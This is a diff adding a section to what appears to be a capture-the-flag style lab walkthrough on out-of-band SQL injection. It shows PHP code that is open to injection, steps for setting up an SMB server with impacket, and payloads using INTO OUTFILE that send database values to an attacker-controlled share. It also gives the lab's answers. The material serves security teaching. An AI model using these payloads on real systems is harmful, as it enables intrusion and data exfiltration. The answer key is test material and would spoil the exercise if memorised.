@@ -608,6 +608,101 @@ In this practical scenario, we will demonstrate how an attacker can exfiltrate d
 
 the AttackBox (your attacking machine) will create a shared folder called `logs` on its network. This share is accessible over the network and allows files from other machines to be written to it.  You may assume a scenario when you get a vulnerable system and want to pivot data to another network share system. The attacker will leverage this share to exfiltrate data Out-of-band. To have a network share, we would start the AttackBox and execute the following command in the terminal:
 
+Navigate to `impacket` directory using `cd /usr/share/doc/python3-impacket/examples/` as I am using Kali Linux.
+
+Enter the command `python3 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp` to start the SMB server sharing the `/tmp` directory.
+
+<img width="427" height="114" alt="image" src="https://github.com/user-attachments/assets/8fe2d318-7093-4e1c-ace3-593b30a9128b" />
+
+You can access the contents of the network share by entering the command `smbclient //ATTACKBOX_IP/logs -U guest -N`. This would allow you to connect to the network share, and then you can issue the command `ls` to list all the commands.
+
+**Note**: Use the tun0 IP as ATTACKBOX_IP.
+
+<img width="641" height="218" alt="image" src="https://github.com/user-attachments/assets/601e40e6-92e8-4c3e-8b3a-0b9cc87c9b6f" />
+
+We have the same web application with a search feature that queries visitors who visit the library. The server-side code for this feature is vulnerable to SQL injection, and you can access it at `http://10.49.138.25/oob/search_visitor.php?visitor_name=Tim`
+
+<img width="449" height="113" alt="image" src="https://github.com/user-attachments/assets/a659902d-0b48-44bb-83e3-ccade994cf4d" />
+
+The server code looks like this:
+
+```
+$visitor_name = $_GET['visitor_name'] ?? '';
+
+$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
+
+echo "<p>Generated SQL Query: $sql</p>";
+
+// Execute multi-query
+if ($conn->multi_query($sql)) {
+    do {
+        // Store first result set
+        if ($result = $conn->store_result()) {
+            if ($result->num_rows > 0) {
+                while ($row = $result->fetch_assoc()) {
+```
+
+**Important Consideration**
+
+It is important to note that the MySQL system variable `secure_file_priv` may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations. 
+- When `secure_file_priv` is Set: MySQL will restrict file operations such as `INTO OUTFILE` to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
+- When `secure_file_priv` is Empty: If the `secure_file_priv` variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.
+
+Attackers typically do not have direct access to check the value of the `secure_file_priv` variable. As a result, they must rely on hit-and-trial methods to determine if and where they can write files, testing various paths to see if file operations succeed.
+
+**Preparing the Payload**
+
+To exploit this vulnerability, the attacker crafts a payload to inject into the `visitor_name` parameter. The payload will be designed to execute an additional SQL query that writes the database version information to an external SMB share.
+
+```
+1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
+```
+
+Let's dissect the above payload:
+- `1'`: Closes the original string within the SQL query.
+- `;`: Ends the first SQL statement.
+- `SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';`: Executes a new SQL statement that retrieves the database version and writes it to an SMB share at `\\ATTACKBOX_IP\logs\out.txt`.
+- `--`: Comments the rest of the original SQL query to prevent syntax errors.
+
+To utilise the payload, the attacker would visit the URL that creates a file in an external SMB share. 
+
+<img width="674" height="75" alt="image" src="https://github.com/user-attachments/assets/3e77bee8-dcf5-4e09-bce0-24d62f60c1f8" />
+
+To access the file, use the `ls /tmp` to see the file received in the `/tmp` directory as shown below: 
+
+<img width="194" height="37" alt="image" src="https://github.com/user-attachments/assets/fc2c1c0b-993e-498d-a04f-69b731d9c1af" />
+
+---
+
+### Answer the questions below
+
+1. What is the output of the @@version on the MySQL server?
+
+10.4.24-MariaDB
+
+<img width="116" height="29" alt="image" src="https://github.com/user-attachments/assets/7097bdeb-7158-4dcf-8df6-1d6c07ed4526" />
+
+2. What is the value of @@basedir variable?
+
+`C:/xampp/mysql`
+
+Execute the SQL Query: `http://10.49.138.25/oob/search_visitor.php?visitor_name=1'; SELECT @@basedir INTO OUTFILE '\\\\YOUR_TUN0_IP\\logs\\basedir.txt'; -- -`
+
+<img width="696" height="83" alt="image" src="https://github.com/user-attachments/assets/b3f083e5-d2c4-470d-87bc-32d53ff70c1b" />
+
+Then see the contents by `cat /tmp/basedir.txt`
+
+<img width="140" height="29" alt="image" src="https://github.com/user-attachments/assets/fab3708e-4bc6-4e2f-b92f-f2477c691591" />
+
+**Note**: Start the python SMB Server again, if you donot see the `basedir.txt`
+
+
+
+
+
+
+
+
 
 
 
